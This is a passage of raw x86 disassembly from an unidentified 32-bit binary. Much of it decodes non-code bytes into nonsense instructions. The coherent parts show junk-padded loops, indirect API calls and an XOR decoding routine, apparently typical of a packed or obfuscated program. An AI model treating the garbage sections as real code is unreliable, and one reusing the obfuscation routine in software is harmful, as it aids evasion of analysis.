  409389:	call   0x86c1fd25
  40938e:	jo     0x4093ad
  409390:	sar    DWORD PTR [edi-0x2c18ea64],0xaf
  409397:	pop    esp
  409398:	and    al,0x25
  40939a:	sbb    eax,DWORD PTR [ebx+0x4c]
  40939d:	stos   DWORD PTR es:[edi],eax
  40939e:	cmp    ebp,DWORD PTR [ebx-0x2d]
  4093a1:	ins    DWORD PTR es:[edi],dx
  4093a2:	daa    
  4093a3:	xor    al,0x30
  4093a5:	sub    eax,0x71a66044
  4093aa:	dec    edx
  4093ab:	shr    BYTE PTR [ecx-0x139016d6],1
  4093b1:	inc    edx
  4093b2:	ins    DWORD PTR es:[edi],dx
  4093b3:	ret    0xc9ad
  4093b6:	xor    BYTE PTR [eax+0x1f],dh
  4093b9:	pop    ss
  4093ba:	inc    esi
  4093bb:	lods   al,BYTE PTR ds:[esi]
  4093bc:	push   edi
  4093bd:	imul   eax,DWORD PTR [esi],0xea2ea0fd
  4093c3:	xor    al,0x9d
  4093c5:	or     DWORD PTR [edx-0x7],eax
  4093c8:	je     0x409438
  4093ca:	or     DWORD PTR [edx+edx*8-0x46a02018],ebx
  4093d1:	test   al,0x45
  4093d3:	sbb    eax,0x49c08a66
  4093d8:	repnz in eax,0xc1
  4093db:	cmp    al,0x94
  4093dd:	sub    BYTE PTR [esi-0x7196d4e0],0x7c
  4093e4:	std    
  4093e5:	inc    ecx
  4093e6:	loop   0x4093cb
  4093e8:	int    0xdd
  4093ea:	repz jno 0x4093d5
  4093ed:	inc    ebp
  4093ee:	lds    eax,FWORD PTR [ebp-0x4a5853f8]
  4093f4:	call   0x83ee:0xe28ab793
  4093fb:	cmp    BYTE PTR [ecx],dh
  4093fd:	hlt    
  4093fe:	adc    ebp,DWORD PTR [edi+edi*4-0x26258170]
  409405:	in     eax,dx
  409406:	sub    BYTE PTR [edx-0x8],bh
  409409:	hlt    
  40940a:	sar    DWORD PTR gs:[eax-0x22],cl
  40940e:	dec    edi
  40940f:	mov    ds:0xf0c5d5e1,eax
  409414:	dec    edi
  409415:	xor    esi,ebx
  409417:	mov    ebp,0xae6636d7
  40941c:	in     eax,dx
  40941d:	pop    eax
  40941e:	sub    DWORD PTR [eax+0x43],eax
  409421:	add    eax,0x8e12b19c
  409426:	in     al,dx
  409427:	mov    ebp,0xffd2863a
  40942c:	xchg   edx,eax
  40942d:	sbb    eax,0xfd50446d
  409432:	mov    cl,0xeb
  409434:	xchg   esi,eax
  409435:	imul   ecx,edi,0x5ddb8068
  40943b:	jo     0x409472
  40943d:	mov    edi,DWORD PTR [edi-0x59]
  409440:	mov    ebx,0xb344b5
  409445:	xor    BYTE PTR [ebx],dl
  409447:	xchg   BYTE PTR [ebx],cl
  409449:	xor    DWORD PTR [eax-0x46],ebp
  40944c:	lds    edx,FWORD PTR [ebp-0x3d127e21]
  409452:	outs   dx,BYTE PTR ds:[esi]
  409453:	test   DWORD PTR [eax+0x7f0f7d78],edx
  409459:	retf   
  40945a:	dec    ebx
  40945b:	(bad)  
  40945c:	dec    edi
  40945d:	jge    0x4094b9
  40945f:	rol    DWORD PTR [ecx-0x109684f],1
  409465:	test   eax,0x8c6d8d1c
  40946a:	std    
  40946b:	retf   
  40946c:	mov    dl,0x31
  40946e:	fisub  DWORD PTR [edx+0x62]
  409471:	sbb    cl,dh
  409473:	(bad)  
  409475:	add    dh,BYTE PTR [edx-0x7a]
  409478:	mov    edi,0xd2e9b1d1
  40947d:	adc    al,0x39
  40947f:	test   al,0x77
  409481:	add    BYTE PTR [edi+0x7672952e],ch
  409487:	jle    0x409499
  409489:	inc    esp
  40948a:	lea    esp,[edi-0x7cc86a95]
  409490:	jo     0x409439
  409492:	loopne 0x409415
  409494:	mov    al,BYTE PTR [ebp-0x1]
  409497:	xor    DWORD PTR ds:0x4247d6,0x9c1
  4094a1:	mov    ecx,DWORD PTR [ebp-0x10]
  4094a4:	and    DWORD PTR ds:0x44b6e4,0x7bc2
  4094ae:	xor    al,0x49
  4094b0:	sub    al,0x35
  4094b2:	mov    DWORD PTR ds:0x41074f,0x4e04
  4094bc:	mov    BYTE PTR [ecx],al
  4094be:	sbb    DWORD PTR ds:0x448990,0x3d76
  4094c8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4094cf:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  4094d6:	or     ecx,0x8aa
  4094dc:	mov    eax,DWORD PTR [ebp-0x8]
  4094df:	and    DWORD PTR ds:0x44e410,0x0
  4094e9:	mov    ecx,DWORD PTR ds:0x44e410
  4094ef:	inc    ecx
  4094f0:	mov    DWORD PTR ds:0x44e410,ecx
  4094f6:	cmp    DWORD PTR ds:0x44e410,0x1e
  4094fd:	jne    0x40951b
  409503:	push   DWORD PTR [ebp-0x10]
  409506:	push   0x410939
  40950b:	push   0x41098d
  409510:	push   0x410939
  409515:	call   DWORD PTR ds:0x443040
  40951b:	cmp    DWORD PTR ds:0x44e410,0x11
  409522:	jb     0x4094e9
  409528:	xor    DWORD PTR ds:0x4247c2,ebx
  40952e:	mov    ecx,0x7510857
  409533:	push   esi
  409534:	and    DWORD PTR ds:0x44b6d4,0x0
  40953e:	jmp    0x409550
  409543:	mov    esi,DWORD PTR ds:0x44b6d4
  409549:	inc    esi
  40954a:	mov    DWORD PTR ds:0x44b6d4,esi
  409550:	cmp    DWORD PTR ds:0x44b6d4,0x17
  409557:	jae    0x409585
  40955d:	cmp    DWORD PTR ds:0x44b6d4,0x1e
  409564:	jne    0x409580
  40956a:	push   0x4107a9
  40956f:	push   DWORD PTR [ebp-0x20]
  409572:	push   DWORD PTR [ebp-0x20]
  409575:	push   0x7787
  40957a:	call   DWORD PTR ds:0x4433a8
  409580:	jmp    0x409543
  409585:	xor    eax,ecx
  409587:	mov    esi,0x32729e
  40958c:	add    eax,esi
  40958e:	jmp    0x4095af
  409593:	mov    DWORD PTR ds:0x44b6e0,0x1147
  40959d:	mov    dl,BYTE PTR [ebp-0x1]
  4095a0:	mov    DWORD PTR ds:0x4489a4,0x2700
  4095aa:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  4095ae:	inc    eax
  4095af:	mov    DWORD PTR ds:0x44b6dc,0x2e0e
  4095b9:	cmp    eax,0x40
  4095bc:	jb     0x409593
  4095c2:	mov    edx,DWORD PTR [ebp-0x8]
  4095c5:	xor    DWORD PTR ds:0x41073f,0x7536
  4095cf:	mov    eax,DWORD PTR [ebp-0xc]
  4095d2:	add    DWORD PTR ds:0x4489a0,0x44e41c
  4095dc:	jmp    0x409732
  4095e1:	cmp    eax,ebx
  4095e3:	bound  edx,QWORD PTR [edx+0x65]
  4095e6:	push   0x39
  4095e8:	pop    ebx
  4095e9:	jmp    0x4095e6
  4095eb:	adc    al,0xc5
  4095ed:	dec    edx
  4095ee:	mov    bl,0xd9
  4095f0:	bound  esi,QWORD PTR [esi+0x277c7ccd]
  4095f6:	jg     0x409674
  4095f8:	jl     0x409620
  4095fa:	stc    
  4095fb:	add    dl,BYTE PTR [edi+esi*4+0x2f]
  4095ff:	es xchg esp,eax
  409601:	and    BYTE PTR [edi],ah
  409603:	or     BYTE PTR [ebx-0x5710ae80],bl
  409609:	mov    eax,0x2f8cc434
  40960e:	mov    edx,ebx
  409610:	sahf   
  409611:	popf   
  409612:	push   edx
  409613:	pop    ds
  409614:	sub    DWORD PTR [ebp+0x5],edi
  409617:	scas   eax,DWORD PTR es:[edi]
  409618:	inc    edx
  409619:	test   BYTE PTR [edi-0x471b4147],bh
  40961f:	xchg   ebx,eax
  409620:	shl    ecx,cl
  409622:	(bad)  
  409623:	stc    
  409624:	add    ebp,DWORD PTR [edi*8+0x40676148]
  40962b:	cmp    edi,DWORD PTR [esi]
  40962d:	in     al,0x1
  40962f:	lods   al,BYTE PTR ds:[esi]
  409630:	dec    ebx
  409631:	shr    DWORD PTR [ecx],0x8d
  409634:	push   cs
  409635:	mov    bl,0x2a
  409637:	mov    esi,ss
  409639:	cmp    al,0x34
  40963b:	cld    
  40963c:	clc    
  40963d:	or     esi,DWORD PTR [edx]
  40963f:	xchg   edx,eax
  409640:	gs mov ecx,0x65fdeb80
  409646:	shl    esi,cl
  409648:	cmp    DWORD PTR [ecx],0xffffffe6
  40964b:	jno    0x4096c9
  40964d:	cdq    
  40964e:	pop    edx
  40964f:	mov    al,ch
  409651:	mov    ebx,0x945ac95e
  409656:	sahf   
  409657:	xchg   edx,eax
  409658:	dec    eax
  409659:	fstp   st(5)
  40965b:	pop    ecx
  40965c:	out    0x8f,eax
  40965e:	adc    DWORD PTR [edx],edx
  409660:	xchg   esp,eax
  409661:	loopne 0x4095eb
  409663:	call   0xf9d0:0x4a8a546b
  40966a:	mov    ecx,0x5437cda
  40966f:	jmp    0x40968b
  409671:	dec    esi
  409672:	pop    ecx
  409673:	dec    ebp
  409674:	cld    
  409675:	jmp    0x409613
  409677:	adc    al,0x3b
  409679:	fs (bad) 
  40967b:	ror    DWORD PTR [ebx],0x43
  40967e:	aaa    
  40967f:	mov    al,ds:0x8fdc995
  409684:	das    
  409685:	int3   
  409686:	sub    al,0x66
  409688:	out    0x68,eax
  40968a:	pop    edx
  40968b:	xchg   DWORD PTR [ebx+0x437441e9],edx
  409691:	call   0x6e9b:0x7f955e24
  409698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409699:	xchg   DWORD PTR [edx-0x25f8d7e5],esp
  40969f:	data16 cmp BYTE PTR [eax-0x78],bl
  4096a3:	lods   al,BYTE PTR ds:[esi]
  4096a4:	iret   
  4096a5:	fisttp DWORD PTR [esi+0x6da4706d]
  4096ab:	push   ebx
  4096ac:	retf   0xeb7b
  4096af:	pop    esi
  4096b0:	jae    0x40971a
  4096b2:	leave  
  4096b3:	loope  0x40963c
  4096b5:	fsubrp st(1),st
  4096b7:	jns    0x40963c
  4096b9:	popa   
  4096ba:	fisttp WORD PTR [ebx+0x1e]
  4096bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096be:	pop    eax
  4096bf:	and    al,0x37
  4096c1:	jnp    0x4096a5
  4096c3:	and    esp,DWORD PTR [edx-0x4d]
  4096c6:	jp     0x40970c
  4096c8:	pop    eax
  4096c9:	sbb    DWORD PTR [ebx-0x2a48cfaa],ebp
  4096cf:	lods   al,BYTE PTR ds:[esi]
  4096d0:	fsubr  st(6),st
  4096d2:	aad    0xe9
  4096d4:	ins    BYTE PTR es:[edi],dx
  4096d5:	lock ss imul ebp,edi,0xffffff88
  4096da:	adc    BYTE PTR [eax+edx*4],bh
  4096dd:	push   ebp
  4096de:	ins    DWORD PTR es:[edi],dx
  4096df:	in     eax,dx
  4096e0:	dec    ebx
  4096e1:	inc    ebx
  4096e2:	cwde   
  4096e3:	adc    eax,0x8e01d652
  4096e8:	retf   0xcc23
  4096eb:	sbb    esp,ebx
  4096ed:	loope  0x40971d
  4096ef:	jecxz  0x409672
  4096f1:	mov    esi,0xbbbe1d9b
  4096f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096f7:	xor    eax,0xd65386b9
  4096fc:	and    al,0xec
  4096fe:	pop    esp
  4096ff:	pop    eax
  409700:	add    al,0x6b
  409702:	mov    ds:0x73207413,eax
  409707:	and    al,0x90
  409709:	pop    cx
  40970b:	push   edi
  40970c:	iret   
  40970d:	cmp    al,0x43
  40970f:	adc    BYTE PTR [edx-0x4a],dh
  409712:	dec    eax
  409713:	shr    BYTE PTR [ebp-0x78],cl
  409716:	mov    eax,DWORD PTR [esi+0x26]
  409719:	popa   
  40971a:	mov    BYTE PTR [edx+0x65825221],ch
  409720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409721:	lahf   
  409722:	loope  0x409738
  409724:	or     cl,BYTE PTR [eax-0x48ed989f]
  40972a:	add    ah,BYTE PTR [ecx+0x6f396e2a]
  409730:	test   al,0x40
  409732:	xor    edx,ecx
  409734:	add    edx,esi
  409736:	mov    DWORD PTR ds:0x44899c,0x4464
  409740:	cmp    edx,eax
  409742:	mov    DWORD PTR ds:0x4247d2,0xc14
  40974c:	je     0x40993f
  409752:	add    DWORD PTR ds:0x448998,0x1465
  40975c:	push   ebx
  40975d:	and    DWORD PTR ds:0x44b6d8,0x0
  409767:	mov    eax,ds:0x44b6d8
  40976c:	inc    eax
  40976d:	mov    ds:0x44b6d8,eax
  409772:	cmp    DWORD PTR ds:0x44b6d8,0x10
  409779:	jne    0x409785
  40977f:	call   DWORD PTR ds:0x4433ac
  409785:	cmp    DWORD PTR ds:0x44b6d8,0xf
  40978c:	jne    0x40979d
  409792:	mov    eax,ds:0x44b6d8
  409797:	inc    eax
  409798:	mov    ds:0x44b6d8,eax
  40979d:	cmp    DWORD PTR ds:0x44b6d8,0x1d
  4097a4:	jb     0x409767
  4097aa:	push   edi
  4097ab:	jmp    0x409901
  4097b0:	push   esp
  4097b1:	ss push edx
  4097b3:	std    
  4097b4:	push   edx
  4097b5:	jge    0x40981e
  4097b7:	pop    ebp
  4097b8:	add    al,0xa1
  4097ba:	or     eax,0xe885ee0d
  4097bf:	sub    DWORD PTR [ecx-0x31],esi
  4097c2:	jl     0x409840
  4097c4:	daa    
  4097c5:	jg     0x409843
  4097c7:	jl     0x4097cd
  4097c9:	in     al,dx
  4097ca:	sbb    al,0x77
  4097cc:	dec    edi
  4097cd:	dec    ebp
  4097ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097cf:	call   0x3ed0e0ee
  4097d4:	mov    ds:0xba5305ee,al
  4097d9:	repnz lods al,BYTE PTR ds:[esi]
  4097db:	inc    edx
  4097dc:	add    eax,0xb898d305
  4097e1:	stc    
  4097e2:	mov    edx,0xd5f34b6a
  4097e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097e8:	repnz add BYTE PTR [edx+ebp*2],ah
  4097ec:	mov    ebx,0xdf737f07
  4097f1:	push   ss
  4097f2:	cdq    
  4097f3:	adc    BYTE PTR [ecx+0x62],bh
  4097f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097f7:	mov    ebx,0x2398e23a
  4097fc:	mov    edi,edi
  4097fe:	gs (bad) 
  409800:	pop    ds
  409801:	out    0xd0,eax
  409803:	loope  0x409846
  409805:	(bad)  
  409806:	in     al,0xa8
  409808:	xchg   esi,eax
  409809:	test   BYTE PTR ds:0xab54aa2d,al
  40980f:	hlt    
  409810:	test   al,0xa9
  409812:	rcr    ch,cl
  409814:	scas   eax,DWORD PTR es:[edi]
  409815:	js     0x49205dec
  40981b:	(bad)  
  40981c:	pop    ebp
  40981d:	inc    ecx
  40981e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  409820:	adc    BYTE PTR [ecx+0x70],dh
  409823:	stos   BYTE PTR es:[edi],al
  409824:	xchg   edx,eax
  409825:	in     eax,0xab
  409827:	iret   
  409828:	and    edx,DWORD PTR [edi+0xa]
  40982b:	and    al,bh
  40982d:	aaa    
  40982e:	push   eax
  40982f:	gs jmp 0x7b84:0x93e91de5
  409837:	stos   DWORD PTR es:[edi],eax
  409838:	int3   
  409839:	test   DWORD PTR [ebp+0xf],0x164afc3b
  409840:	clc    
  409841:	dec    eax
  409842:	add    al,0x6
  409844:	sbb    DWORD PTR [ecx+0x2d],0x9ee5e48
  40984b:	add    al,0x6b
  40984d:	fmul   DWORD PTR [edi+ecx*1-0x75b20204]
  409854:	sub    DWORD PTR [edi+0x478026ac],ecx
  40985a:	test   al,0xe0
  40985c:	add    eax,edx
  40985e:	fcmovbe st,st(4)
  409860:	xchg   dh,bl
  409862:	out    dx,al
  409863:	mov    bl,0x2a
  409865:	pop    esp
  409866:	adc    eax,0x77ed0a7a
  40986b:	mov    dh,0xf
  40986d:	xchg   DWORD PTR ds:0xf166393,esi
  409873:	sub    DWORD PTR [ebp+0x45ab5325],0x9c356f2e
  40987d:	repz mov edx,0x6dd7c047
  409883:	scas   eax,DWORD PTR es:[edi]
  409884:	dec    esi
  409885:	shl    DWORD PTR [esi+eax*4],1
  409888:	jmp    0x409903
  40988a:	jmp    0x83f4:0xd0978a54
  409891:	inc    ebp
  409892:	sti    
  409893:	jp     0x40983c
  409895:	repz sub BYTE PTR [esi],0x98
  409899:	pop    ss
  40989a:	dec    esp
  40989b:	imul   edx,esi,0xc
  40989e:	shl    BYTE PTR [ebp+0x2e],0x2c
  4098a2:	sbb    eax,0x6ae68070
  4098a7:	inc    edi
  4098a8:	xchg   ecx,eax
  4098a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098aa:	mov    esi,0x3292e2c0
  4098af:	bound  ebx,QWORD PTR [ebx+ecx*2+0x8]
  4098b3:	push   0xaaa2e34c
  4098b8:	pcmpeqb mm3,QWORD PTR [edi+0x6c65f93]
  4098bf:	dec    BYTE PTR [ebp-0x64a5532f]
  4098c5:	out    dx,al
  4098c6:	fst    DWORD PTR [ebx-0x2d93357e]
  4098cc:	adc    eax,0x8a3979aa
  4098d1:	(bad)  
  4098d2:	std    
  4098d3:	test   BYTE PTR [edi+0x5b],0x68
  4098d7:	in     al,0x8e
  4098d9:	or     al,0x89
  4098db:	bound  edx,QWORD PTR [esp+edi*8+0x571a2b38]
  4098e2:	add    al,0x92
  4098e4:	not    ebp
  4098e6:	stos   BYTE PTR es:[edi],al
  4098e7:	pop    ds
  4098e8:	jbe    0x409934
  4098ea:	and    DWORD PTR [ebp-0x26],ebx
  4098ed:	cmp    DWORD PTR [edx],0x17dba316
  4098f3:	ss test eax,0x19ad5177
  4098f9:	or     edx,ecx
  4098fb:	ja     0x40989a
  4098fd:	and    DWORD PTR [edi],ebp
  4098ff:	or     DWORD PTR [edx],esi
  409901:	mov    edi,DWORD PTR [ebp+0x8]
  409904:	mov    eax,0x8a42
  409909:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40990e:	mov    edi,0x3b08
  409913:	add    ax,di
  409916:	movzx  eax,ax
  409919:	mov    DWORD PTR [ebp-0x14],eax
  40991c:	mov    eax,DWORD PTR [ebp+0x8]
  40991f:	movzx  eax,WORD PTR [eax+edx*4]
  409923:	xor    eax,0x8a42
  409928:	add    eax,edi
  40992a:	mov    edi,DWORD PTR [ebp-0x14]
  40992d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  409931:	mov    eax,DWORD PTR [ebp-0xc]
  409934:	inc    edx
  409935:	cmp    edx,eax
  409937:	jne    0x409901
  40993d:	pop    edi
  40993e:	pop    ebx
  40993f:	mov    eax,DWORD PTR [ebp-0x8]
  409942:	mov    edx,DWORD PTR [ebp+0x10]
  409945:	xor    eax,ecx
  409947:	add    eax,esi
  409949:	mov    DWORD PTR [edx],eax
  40994b:	mov    eax,DWORD PTR [ebp-0x8]
  40994e:	xor    eax,ecx
  409950:	add    eax,esi
  409952:	mov    DWORD PTR [ebp+0x8],eax
  409955:	mov    eax,DWORD PTR [ebp+0x8]
  409958:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40995c:	mov    dl,BYTE PTR [ebp-0x1]
  40995f:	cmp    al,dl
  409961:	je     0x409afa
  409967:	mov    eax,DWORD PTR [ebp+0x8]
  40996a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40996e:	mov    edx,DWORD PTR [ebp+0xc]
  409971:	cmp    al,BYTE PTR [edx]
  409973:	jne    0x409b20
  409979:	mov    eax,DWORD PTR [ebp-0x8]
  40997c:	mov    edx,DWORD PTR [ebp+0xc]
  40997f:	movsx  edx,BYTE PTR [edx]
  409982:	xor    eax,ecx
  409984:	add    eax,esi
  409986:	cmp    edx,eax
  409988:	je     0x409b14
  40998e:	jmp    0x409ae4
  409993:	add    ah,ah
  409995:	clc    
  409996:	pop    es
  409997:	clc    
  409998:	sbb    esp,ebx
  40999a:	sti    
  40999b:	ins    DWORD PTR es:[edi],dx
  40999c:	sbb    BYTE PTR [esp+ebp*8],ch
  40999f:	mov    ecx,gs
  4099a1:	pop    es
  4099a2:	or     edi,DWORD PTR [eax]
  4099a4:	into   
  4099a5:	jl     0x409a23
  4099a7:	daa    
  4099a8:	jg     0x409a26
  4099aa:	jl     0x40999c
  4099ac:	adc    BYTE PTR [esi-0x62691b2b],ch
  4099b2:	fcomp  QWORD PTR [ebx-0xa381e38]
  4099b8:	cmp    al,0xf8
  4099ba:	adc    BYTE PTR [eax-0x473975ca],dh
  4099c0:	daa    
  4099c1:	data16 jo 0x409a1c
  4099c4:	sar    BYTE PTR [ebp+eax*1+0x4b866abf],1
  4099cb:	outs   dx,DWORD PTR ds:[esi]
  4099cc:	loope  0x4099a0
  4099ce:	mov    ecx,0x1ec76a6f
  4099d3:	xor    al,0x73
  4099d5:	dec    edx
  4099d6:	pusha  
  4099d7:	mov    dh,0xdc
  4099d9:	jno    0x4099bc
  4099db:	int3   
  4099dc:	shr    ecx,0x17
  4099df:	mov    bh,0x10
  4099e1:	and    eax,0x7a3eabd7
  4099e6:	dec    edi
  4099e7:	mov    esp,0x68a04a37
  4099ec:	fistp  WORD PTR [ecx-0x45]
  4099ef:	sub    bh,BYTE PTR [edx-0x14ca4c53]
  4099f5:	loop   0x409a61
  4099f7:	sbb    al,0x7
  4099f9:	add    al,0xc3
  4099fb:	xchg   ebx,eax
  4099fc:	jns    0x409a58
  4099fe:	sub    al,0x7f
  409a00:	(bad)  
  409a01:	mov    al,ds:0xc8b8a23c
  409a06:	imul   ecx,DWORD PTR [edi+0x33],0x142b0d52
  409a0d:	push   es
  409a0e:	xor    ah,al
  409a10:	sub    dl,bl
  409a12:	loopne 0x4099f7
  409a14:	ret    0x3b2e
  409a17:	add    ebp,ebx
  409a19:	je     0x409a78
  409a1b:	int    0x7d
  409a1d:	mov    bh,0xf5
  409a1f:	ja     0x4099f2
  409a21:	in     al,0x24
  409a23:	pop    ebp
  409a24:	add    eax,0x552aed00
  409a29:	sub    al,0xd4
  409a2b:	cmp    BYTE PTR [edx+0x4d1e50eb],al
  409a31:	test   eax,0xcea7fb92
  409a36:	pushf  
  409a37:	leave  
  409a38:	xchg   DWORD PTR [edx-0x41],eax
  409a3b:	adc    al,0xb9
  409a3d:	and    al,BYTE PTR [ebx+0x4345873b]
  409a43:	mov    al,ds:0x162f07d0
  409a48:	and    eax,0xf5dceb20
  409a4d:	(bad)  
  409a4e:	jp     0x409a8d
  409a50:	ins    BYTE PTR es:[edi],dx
  409a51:	mov    ds:0x7839e9c4,al
  409a56:	(bad)  
  409a57:	sub    BYTE PTR ds:0x24e5fb22,ah
  409a5d:	xchg   ecx,eax
  409a5e:	pop    ebp
  409a5f:	enter  0x7f62,0x69
  409a63:	xor    eax,0xed2bde26
  409a68:	adc    BYTE PTR ds:0x819d31ef,ch
  409a6e:	sub    eax,DWORD PTR [esi-0x31]
  409a71:	cld    
  409a72:	cs push ds
  409a74:	daa    
  409a75:	xchg   ebp,eax
  409a76:	cmp    al,0x1c
  409a78:	sbb    eax,0x4c9a999e
  409a7d:	(bad)  
  409a7e:	cmp    BYTE PTR [esi+edx*2+0x0],cl
  409a82:	add    dh,BYTE PTR [edi-0x317b25e]
  409a88:	jg     0x409ac5
  409a8a:	addr16 cmc 
  409a8c:	mov    eax,0xf35c7f31
  409a91:	fcmovu st,st(6)
  409a93:	xchg   ecx,eax
  409a94:	sub    eax,esp
  409a96:	mov    BYTE PTR [edi+0x15],dh
  409a99:	popa   
  409a9a:	shr    DWORD PTR [esi+0x2d],0x3
  409a9e:	push   ecx
  409a9f:	int3   
  409aa0:	call   FWORD PTR [ebx-0x19]
  409aa3:	inc    esi
  409aa4:	mov    ch,0x53
  409aa6:	repnz sbb BYTE PTR [esi+0x67],al
  409aaa:	mov    esp,esp
  409aac:	loope  0x409a45
  409aae:	and    al,0x60
  409ab0:	ret    0xec19
  409ab3:	jmp    0xff084dc3
  409ab8:	xchg   ebp,eax
  409ab9:	lds    esp,FWORD PTR [eax-0x7f5e7da]
  409abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ac0:	ret    
  409ac1:	xchg   ecx,eax
  409ac2:	scas   al,BYTE PTR es:[edi]
  409ac3:	inc    edi
  409ac4:	push   esp
  409ac5:	or     al,BYTE PTR ds:0xfb0ab568
  409acb:	mov    esi,edx
  409acd:	outs   dx,DWORD PTR ds:[esi]
  409ace:	into   
  409acf:	rol    BYTE PTR [esp+ecx*1-0xcedf860],1
  409ad6:	addr16 sub eax,0xb3448909
  409adc:	hlt    
  409add:	retf   
  409ade:	xchg   esp,eax
  409adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ae0:	cmp    eax,0xc70eec1d
  409ae5:	inc    ebp
  409ae6:	call   0x746987a
  409aeb:	lea    eax,[ebp-0x18]
  409aee:	mov    DWORD PTR [ebp-0x14],eax
  409af1:	mov    eax,DWORD PTR [ebp-0x14]
  409af4:	add    DWORD PTR [eax],0x705fa8f
  409afa:	mov    eax,DWORD PTR [ebp-0x10]
  409afd:	mov    edx,DWORD PTR [ebp+0x8]
  409b00:	xor    eax,ecx
  409b02:	lea    eax,[eax+edx*1+0x32729e]
  409b09:	mov    DWORD PTR [ebp+0x8],eax
  409b0c:	inc    DWORD PTR [ebp+0xc]
  409b0f:	jmp    0x409955
  409b14:	mov    eax,DWORD PTR [ebp-0x10]
  409b17:	xor    eax,ecx
  409b19:	mov    ecx,DWORD PTR [ebp+0x10]
  409b1c:	add    eax,esi
  409b1e:	mov    DWORD PTR [ecx],eax
  409b20:	pop    esi
  409b21:	leave  
  409b22:	ret    0xc
  409b25:	push   ebp
  409b26:	mov    ebp,esp
  409b28:	push   ecx
  409b29:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  409b30:	sub    DWORD PTR ds:0x41074b,edx
  409b36:	mov    eax,DWORD PTR [ebp+0x8]
  409b39:	jmp    0x409ca4
  409b3e:	push   cs
  409b3f:	xchg   BYTE PTR [esi],dl
  409b41:	fs xchg esi,eax
  409b43:	fs dec esi
  409b45:	data16 jg 0x409bb3
  409b48:	pop    esp
  409b49:	lds    ebx,FWORD PTR [edi+0x7a]
  409b4c:	retf   0xe3f0
  409b4f:	sar    DWORD PTR [esp+edi*2-0x36],0x7f
  409b54:	jl     0x409bd2
  409b56:	sub    DWORD PTR [ecx],ebx
  409b58:	jno    0x409b4b
  409b5a:	ja     0x409b77
  409b5c:	mov    dh,0x54
  409b5e:	push   cs
  409b5f:	ret    0x8d93
  409b62:	scas   eax,DWORD PTR es:[edi]
  409b63:	add    dh,ch
  409b65:	push   ecx
  409b66:	mov    WORD PTR [eax+0x197d5085],?
  409b6c:	sub    ebp,eax
  409b6e:	dec    eax
  409b6f:	or     eax,0x2e6ecb71
  409b74:	imul   BYTE PTR [ebp+0x25718baf]
  409b7a:	pop    es
  409b7b:	push   0xe524fe31
  409b80:	mov    bl,0x8f
  409b82:	sub    al,BYTE PTR [ebp-0x8]
  409b85:	ds jb  0x409baa
  409b88:	mov    cl,0x10
  409b8a:	xor    ebx,edi
  409b8c:	ret    
  409b8d:	pop    edi
  409b8e:	arpl   WORD PTR [eax],ax
  409b90:	jo     0x409b84
  409b92:	inc    eax
  409b93:	mov    ah,0x44
  409b95:	push   esp
  409b96:	xor    DWORD PTR [eax+0x6b99fa21],ecx
  409b9c:	sbb    BYTE PTR [ecx+0x41],dh
  409b9f:	sbb    eax,0x65acf7fd
  409ba4:	imul   cl
  409ba6:	jmp    0xfa481ae8
  409bab:	(bad)  
  409bac:	adc    al,0xa2
  409bae:	imul   esp,eax,0x9d01747
  409bb4:	sbb    dl,bh
  409bb6:	rol    DWORD PTR [edi-0xf],0x6b
  409bba:	push   0xffffffcd
  409bbc:	add    BYTE PTR [ebp+0x54],0xcd
  409bc0:	stos   BYTE PTR es:[edi],al
  409bc1:	mov    al,0xf3
  409bc3:	(bad)  
  409bc5:	mov    esp,0x3fe90e2a
  409bca:	lds    edi,FWORD PTR [ecx-0x4d]
  409bcd:	mov    al,0xef
  409bcf:	into   
  409bd0:	cmp    al,0xb1
  409bd2:	fild   WORD PTR [eax]
  409bd4:	jg     0x409bfa
  409bd6:	jmp    0x2221dcda
  409bdb:	mov    ebp,0x8c165cea
  409be0:	xor    eax,DWORD PTR [ebp+0x22]
  409be3:	fld    DWORD PTR [edi+0x22649b1e]
  409be9:	out    dx,eax
  409bea:	aad    0xf
  409bec:	jmp    0x5427:0x844c63ab
  409bf3:	push   ecx
  409bf4:	neg    DWORD PTR [esi]
  409bf6:	shr    BYTE PTR [ebx],1
  409bf8:	sub    ah,BYTE PTR [ebp-0x79]
  409bfb:	sub    BYTE PTR [esi-0x17],dh
  409bfe:	into   
  409bff:	scas   eax,DWORD PTR es:[edi]
  409c00:	mov    ecx,es
  409c02:	out    dx,eax
  409c03:	mov    al,ds:0x4500dd48
  409c08:	sbb    bl,al
  409c0a:	popa   
  409c0b:	push   esi
  409c0c:	push   es
  409c0d:	mov    cl,0xe3
  409c0f:	pop    ecx
  409c10:	mul    DWORD PTR [ebp+0x57]
  409c13:	repnz cmp dh,al
  409c16:	jne    0x409c7c
  409c18:	mul    BYTE PTR [ebp-0x20]
  409c1b:	mov    DWORD PTR [esp+esi*1+0x27],esp
  409c1f:	(bad)  
  409c20:	mov    ebp,0xb5c72230
  409c25:	ds pop edi
  409c27:	fmul   QWORD PTR [eax]
  409c29:	jno    0x409c32
  409c2b:	mov    edx,0x4dd9967
  409c30:	sbb    DWORD PTR [edx+ecx*4+0x70e61b9f],edi
  409c37:	scas   eax,DWORD PTR es:[edi]
  409c38:	xchg   esi,eax
  409c39:	call   0xc58c:0xde966005
  409c40:	xchg   ebp,eax
  409c41:	inc    edx
  409c42:	es or  eax,0x25eff8ce
  409c48:	jl     0x409cae
  409c4a:	push   esp
  409c4b:	ja     0x409bdb
  409c4d:	std    
  409c4e:	ja     0x409cb7
